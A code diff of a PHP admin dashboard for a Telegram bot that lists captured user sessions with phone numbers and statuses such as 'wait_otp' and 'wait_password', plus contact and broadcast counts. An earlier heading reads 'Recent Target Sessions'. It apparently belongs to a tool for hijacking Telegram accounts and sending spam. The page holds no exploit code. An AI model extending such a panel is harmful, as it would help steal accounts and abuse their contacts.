@@ -3,107 +3,76 @@ require_once __DIR__ . '/../core/auth.php';
 check_auth();
 require_once __DIR__ . '/../core/layout.php';
 
-// Fetch stats
 $stats = [
-    'sessions' => $pdo->query("SELECT COUNT(*) FROM user_sessions")->fetchColumn(),
-    'contacts' => $pdo->query("SELECT COUNT(*) FROM contacts")->fetchColumn(),
-    'broadcasts' => $pdo->query("SELECT COUNT(*) FROM broadcasts")->fetchColumn(),
-    'sent' => $pdo->query("SELECT SUM(sent_count) FROM broadcasts")->fetchColumn() ?? 0,
+    'users'      => (int)$pdo->query("SELECT COUNT(*) FROM users")->fetchColumn(),
+    'sessions'   => (int)$pdo->query("SELECT COUNT(*) FROM user_sessions WHERE status='active'")->fetchColumn(),
+    'contacts'   => (int)$pdo->query("SELECT COUNT(*) FROM contacts")->fetchColumn(),
+    'broadcasts' => (int)$pdo->query("SELECT COUNT(*) FROM broadcasts")->fetchColumn(),
 ];
 
 load_header('Dashboard');
 ?>
+
 <div class="row g-3 mb-4">
-    <div class="col-md-3">
-        <div class="card border-0 shadow-sm">
-            <div class="card-body d-flex align-items-center">
-                <div class="bg-primary bg-opacity-10 text-primary rounded p-3 me-3">
-                    <i class="fa-solid fa-users fs-4"></i>
-                </div>
-                <div>
-                    <h6 class="text-muted mb-1 small fw-bold">Active Sessions</h6>
-                    <h3 class="mb-0 fw-bold"><?= number_format($stats['sessions']) ?></h3>
-                </div>
+    <?php
+    $cards = [
+        ['Bot Users',        $stats['users'],      'fa-users',         'var(--accent)',   'var(--blue-dim)'],
+        ['Active Sessions',  $stats['sessions'],   'fa-mobile-alt',    '#3fb950',         'var(--green-dim)'],
+        ['Total Contacts',   $stats['contacts'],   'fa-address-book',  '#e3b341',         'var(--yellow-dim)'],
+        ['Broadcasts',       $stats['broadcasts'], 'fa-bullhorn',      '#ff7b72',         'var(--red-dim)'],
+    ];
+    foreach ($cards as [$label, $val, $icon, $color, $bg]):
+    ?>
+    <div class="col-6 col-md-3">
+        <div class="stat-card">
+            <div class="stat-icon" style="background:<?= $bg ?>; color:<?= $color ?>">
+                <i class="fas <?= $icon ?>"></i>
+            </div>
+            <div>
+                <div class="stat-val"><?= number_format($val) ?></div>
+                <div class="stat-label"><?= $label ?></div>
             </div>
         </div>
     </div>
-    <div class="col-md-3">
-        <div class="card border-0 shadow-sm">
-            <div class="card-body d-flex align-items-center">
-                <div class="bg-success bg-opacity-10 text-success rounded p-3 me-3">
-                    <i class="fa-solid fa-address-book fs-4"></i>
-                </div>
-                <div>
-                    <h6 class="text-muted mb-1 small fw-bold">Total Contacts</h6>
-                    <h3 class="mb-0 fw-bold"><?= number_format($stats['contacts']) ?></h3>
-                </div>
-            </div>
-        </div>
+    <?php endforeach; ?>
+</div>
+
+<div class="card">
+    <div class="card-header d-flex align-items-center justify-content-between">
+        <span><i class="fas fa-clock me-2 text-muted" style="font-size:.75rem"></i>Recent Sessions</span>
+        <a href="sessions.php" class="btn btn-sm btn-secondary">View All</a>
     </div>
-    <div class="col-md-3">
-        <div class="card border-0 shadow-sm">
-            <div class="card-body d-flex align-items-center">
-                <div class="bg-warning bg-opacity-10 text-warning rounded p-3 me-3">
-                    <i class="fa-solid fa-bullhorn fs-4"></i>
-                </div>
-                <div>
-                    <h6 class="text-muted mb-1 small fw-bold">Broadcasts</h6>
-                    <h3 class="mb-0 fw-bold"><?= number_format($stats['broadcasts']) ?></h3>
-                </div>
-            </div>
-        </div>
-    </div>
-    <div class="col-md-3">
-        <div class="card border-0 shadow-sm">
-            <div class="card-body d-flex align-items-center">
-                <div class="bg-info bg-opacity-10 text-info rounded p-3 me-3">
-                    <i class="fa-solid fa-paper-plane fs-4"></i>
-                </div>
-                <div>
-                    <h6 class="text-muted mb-1 small fw-bold">Messages Sent</h6>
-                    <h3 class="mb-0 fw-bold"><?= number_format($stats['sent']) ?></h3>
-                </div>
-            </div>
-        </div>
+    <div class="table-responsive">
+        <table class="table">
+            <thead><tr>
+                <th>Telegram ID</th>
+                <th>Phone</th>
+                <th>Status</th>
+                <th>Date</th>
+            </tr></thead>
+            <tbody>
+            <?php
+            $rows = $pdo->query("SELECT * FROM user_sessions ORDER BY id DESC LIMIT 8")->fetchAll();
+            if ($rows): foreach ($rows as $r):
+                $badge = match($r['status']) {
+                    'active'   => 'badge-success',
+                    'pending','wait_otp','wait_password' => 'badge-warning',
+                    'banned'   => 'badge-danger',
+                    default    => 'badge-secondary'
+                };
+            ?>
+            <tr>
+                <td><code class="mono"><?= h($r['telegram_id']) ?></code></td>
+                <td><?= h($r['phone_number'] ?: '—') ?></td>
+                <td><span class="badge <?= $badge ?>"><?= ucfirst(h($r['status'])) ?></span></td>
+                <td style="color:var(--text-muted);font-size:.75rem"><?= date('d M H:i', strtotime($r['created_at'])) ?></td>
+            </tr>
+            <?php endforeach; else: ?>
+            <tr><td colspan="4" class="text-center py-4" style="color:var(--text-muted)">No sessions yet.</td></tr>
+            <?php endif; ?>
+            </tbody>
+        </table>
     </div>
 </div>
 
-<div class="card border-0 shadow-sm">
-    <div class="card-header border-bottom">
-        <h6 class="mb-0 fw-bold"><i class="fa-solid fa-chart-area text-primary me-2"></i> Recent Target Sessions</h6>
-    </div>
-    <div class="card-body p-0">
-        <div class="table-responsive">
-            <table class="table mb-0 table-hover">
-                <thead class="bg-light">
-                    <tr>
-                        <th class="border-top-0">Telegram ID</th>
-                        <th class="border-top-0">Phone Number</th>
-                        <th class="border-top-0">Status</th>
-                        <th class="border-top-0 text-end">Action</th>
-                    </tr>
-                </thead>
-                <tbody>
-                    <?php
-                    $stmt = $pdo->query("SELECT * FROM user_sessions ORDER BY id DESC LIMIT 5");
-                    $sessions = $stmt->fetchAll();
-                    if (count($sessions) > 0) {
-                        foreach ($sessions as $s) {
-                            $status_class = $s['status'] == 'active' ? 'success' : ($s['status'] == 'pending' ? 'warning' : 'danger');
-                            echo '<tr>
-                                <td><span class="fw-medium">'.$s['telegram_id'].'</span></td>
-                                <td>'.$s['phone_number'].'</td>
-                                <td><span class="badge bg-'.$status_class.' rounded-pill">'.ucfirst($s['status']).'</span></td>
-                                <td class="text-end"><button class="btn btn-sm btn-light border"><i class="fa-solid fa-cog"></i></button></td>
-                            </tr>';
-                        }
-                    } else {
-                        echo '<tr><td colspan="4" class="text-center py-4 text-muted">No sessions yet. Members can connect via Bot.</td></tr>';
-                    }
-                    ?>
-                </tbody>
-            </table>
-        </div>
-    </div>
-</div>
 <?php load_footer(); ?>
